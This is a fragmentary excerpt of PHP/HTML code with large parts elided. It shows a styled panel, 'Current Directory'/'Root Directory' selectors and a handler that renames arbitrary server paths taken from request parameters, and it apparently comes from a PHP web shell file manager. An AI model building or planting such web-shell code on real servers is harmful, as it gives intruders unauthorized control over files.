...
.glow {
            ...
            /* You can add more shadow layers if desired */
        }
...
<input type="radio" value="1" name="dirnya" checked>Current Directory [ '.cekdir().' ]
<input type="radio" value="2" name="dirnya" >Root Directory [ '.cekroot().' ]
<br>
...
if (isset($_GET['fileloc'])) {
	...
	if (isset($_POST['gantin'])) {
		$ren = @rename($_POST['path'], $_GET['path']."/".$_POST['newname']);
		if ($ren == true) {
